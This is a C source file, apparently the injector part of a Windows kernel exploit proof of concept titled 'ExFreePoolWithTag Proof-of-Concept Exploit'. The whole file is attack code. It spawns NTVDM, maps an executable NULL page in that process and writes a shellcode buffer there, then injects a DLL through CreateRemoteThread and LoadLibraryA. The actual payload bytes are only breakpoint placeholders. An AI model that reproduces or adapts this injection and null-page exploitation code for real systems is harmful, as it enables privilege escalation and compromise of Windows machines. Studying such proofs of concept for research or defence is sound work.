#pragma warning (disable : 6387)

#include "injector.h"

int main(int argc, char** argv)
{
	char shellcode[4096], unused = 0, *null_page = 0, *dll_path_memory = 0, current_directory[MAX_PATH], dll_path[MAX_PATH];
	HANDLE h_ntvdm = 0;
	HMODULE h_kernel32 = 0;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;
	void* load_library_func_address = 0;

	memset(&shellcode, 0xCC, sizeof(shellcode));
	RtlSecureZeroMemory(&current_directory, sizeof(current_directory));
	RtlSecureZeroMemory(&dll_path, sizeof(dll_path));
	RtlSecureZeroMemory(&startup_info, sizeof(startup_info));
	RtlSecureZeroMemory(&process_information, sizeof(process_information));

	printf("%s[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Lets Exploit!", BANNER);

	if (!CreateProcessA(0, "\"C:\\Windows\\System32\\ntvdm.exe\"", 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &startup_info, &process_information))
	{
		printf("\n[-] Failed to create the NTVDM process. Error: %d (0x%x)", GetLastError(), GetLastError());
		CloseHandle(process_information.hProcess);
		CloseHandle(process_information.hThread);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Created the NTVDM process. Handle Value: 0x%p, Process ID: %d (0x%x)", h_ntvdm, process_information.dwProcessId, process_information.dwProcessId);

	h_ntvdm = OpenProcess(PROCESS_ALL_ACCESS, 0, process_information.dwProcessId);
	if (!h_ntvdm)
	{
		printf("\n[-] Failed to obtain a handle to the NTVDM process. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the NTVDM process. Handle Value: 0x%p", h_ntvdm);

	null_page = VirtualAllocEx(h_ntvdm, 1, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("\n[+] Allocated 4096 bytes of stack memory onto the NULL page of the NTVDM process. Address: 0x%p", null_page);

	if (!WriteProcessMemory(h_ntvdm, null_page, &shellcode, sizeof(shellcode), 0))
	{
		printf("\n[-] Failed to write shellcode to the NTVDM process' NULL page. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Wrote shellcode to the NTVDM process' NULL page.");

	h_kernel32 = LoadLibraryA("kernel32.dll");
	if (!h_kernel32)
	{
		printf("\n[-] Failed to load the \"kernel32.dll\" API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded the kernel32.dll API library. Handle Value: 0x%p", h_kernel32);

	load_library_func_address = GetProcAddress(h_kernel32, "LoadLibraryA");
	if (!load_library_func_address)
	{
		printf("\n[-] Failed to locate the \"LoadLibraryA\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
	}
	printf("\n[+] Located the \"LoadLibraryA\" function. Function Address: 0x%p", load_library_func_address);

	GetCurrentDirectoryA(sizeof(current_directory), current_directory);
	sprintf_s(dll_path, sizeof(dll_path), "%s\\%s", current_directory, DLL_NAME);

	dll_path_memory = VirtualAllocEx(h_ntvdm, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!dll_path_memory)
	{
		printf("\n[-] Failed to allocate 4096 bytes of stack memory in the NTVDM process. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes of stack memory in the NTVDM process. Address: 0x%p", dll_path_memory);

	if (!WriteProcessMemory(h_ntvdm, dll_path_memory, dll_path, strlen(dll_path), 0))
	{
		printf("\n[-] Failed to write the DLL path to the NTVDM process' stack memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Wrote the DLL path to the NTVDM process' stack memory. DLL path: %s", dll_path);

	if (!CreateRemoteThread(h_ntvdm, 0, 0, (LPTHREAD_START_ROUTINE)load_library_func_address, dll_path_memory, 0, 0)) {
		printf("\n[-] Failed to inject the DLL into the NTVDM process. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Injected the DLL into the NTVDM process.\n[!] Sit back, and enjoy the show!");

	system("pause");

	CloseHandle(process_information.hProcess);
	CloseHandle(process_information.hThread);
	return 0;
}